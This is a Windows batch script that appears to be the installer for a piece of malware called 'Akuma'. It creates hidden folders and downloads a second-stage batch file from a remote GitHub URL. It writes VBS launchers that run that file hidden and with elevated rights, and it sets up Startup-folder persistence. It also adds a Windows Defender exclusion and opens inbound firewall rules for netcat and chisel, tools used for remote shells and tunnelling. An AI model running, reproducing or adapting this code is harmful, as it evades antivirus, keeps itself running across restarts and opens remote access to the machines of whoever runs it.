@echo off
mkdir %AppData%\Akuma
attrib +h %AppData%\Akuma
attrib +h %AppData%\curl
attrib +h %AppData%\A7uma
mkdir %homedrive%\ShiniGami
attrib +h %homedrive%\ShiniGami
%AppData%\curl\bin\curl.exe -L https://raw.githubusercontent.com/l-urk/Akuma/main/A7uma.bat > %homedrive%\ShiniGami\A7uma.bat
del %AppData%\Akuma\死神.vbs
echo Set objShell = CreateObject("WScript.Shell") >> %AppData%\Akuma\死神.vbs
echo objShell.Run "%homedrive%\ShiniGami\A7uma.bat", 0, False >> %AppData%\Akuma\死神.vbs
del %AppData%\Akuma\beyondbirthday.vbs
echo Set objShell = CreateObject("Shell.Application") >> %AppData%\Akuma\beyondbirthday.vbs
echo objShell.ShellExecute "%AppData%\Akuma\beyondbirthday.bat", "", "", "runas", 0 >> %AppData%\Akuma\beyondbirthday.vbs
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\beyondbirthday.lnk');$s.TargetPath='%AppData%\Akuma\beyondbirthday.vbs';$s.Save()"
echo powershell Add-MpPreference -ExclusionPath "$env:homedrive\Akuma" >> %AppData%\Akuma\beyondbirthday.bat
echo netsh advfirewall firewall delete rule name="Akumanc" >> %AppData%\Akuma\beyondbirthday.bat
echo powershell New-NetFirewallRule -DisplayName "Akumanc" -Direction Inbound -Program "%AppData%\Akuma\nc\nc.exe" -Action Allow >> %AppData%\Akuma\beyondbirthday.bat
echo netsh advfirewall firewall delete rule name="Akumachisel" >> %AppData%\Akuma\beyondbirthday.bat
echo powershell New-NetFirewallRule -DisplayName "Akumachisel" -Direction Inbound -Program "%AppData%\Akuma\chisel.exe" -Action Allow >> %AppData%\Akuma\beyondbirthday.bat
echo start %AppData%\Akuma\死神.vbs >> %AppData%\Akuma\beyondbirthday.bat
echo cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" >> %AppData%\Akuma\beyondbirthday.bat
echo del "beyondbirthday.lnk" >> %AppData%\Akuma\beyondbirthday.bat
set "vbsFilePath=%AppData%\Akuma\beyondbirthday.vbs"
IF EXIST "%vbsFilePath%" (
    cscript "%vbsFilePath%"
) ELSE (
    exit
)
